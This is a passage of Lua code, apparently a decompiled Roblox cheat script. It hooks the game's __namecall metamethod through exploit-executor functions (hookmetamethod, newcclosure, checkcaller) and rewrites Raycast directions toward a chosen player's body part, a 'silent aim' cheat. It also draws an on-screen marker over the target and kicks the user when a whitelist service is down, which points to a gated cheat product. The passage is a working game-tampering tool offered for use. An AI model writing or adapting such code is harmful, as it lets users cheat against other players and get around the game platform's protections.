                    u647.CPA = 0.155
                else
                    u647.CPA = 0.16
                end
            end
        else
            u647.CPA = u647.SA.MHP_A
        end
    end)
    _RenderStepped:Connect(function()
        if u647.SA.Show and (u647.SA.En and u648) then
            if GCP() then
                local v697 = GCP().Parent.PrimaryPart or GCP()
                local v698, v699 = _WorldToViewportPoint(u647.Cam, v697.Position)

                u647.MBX.Visible = v699
                u647.MBX.Position = Vector2.new(v698.X, v698.Y)
            else
                u647.MBX.Visible = false
                u647.MBX.Position = Vector2.new()
            end
        end
    end)

    local u700 = checkcaller or function()
        return false
    end
    local u702 = newcclosure or function(p701)
        return p701
    end
    local u703 = false

    if hookmetamethod then
        local _, _ = pcall(function()
            oldNC = hookmetamethod(game, '__namecall', u702(function(...)
                local v704 = getnamecallmethod()
                local v705 = {...}
                local v706 = v705[1]
                local v707 = Ch(u647.SA.HC)

                if u647.SA.En and (v706 == _Workspace and (not u700() and (v707 and (v704 == 'Raycast' and VA(v705, u647.EA.Raycast))))) then
                    local v708 = v705[2]
                    local v709 = GCP()

                    if v709 then
                        v705[3] = GD(v708, GPP(v709))

                        return oldNC(unpack(v705))
                    end
                end

                return oldNC(...)
            end))
            u703 = true
        end)
    end

    v543:Init()
else
    _LocalPlayer:Kick('Whitelist services down. Try again later.')
end
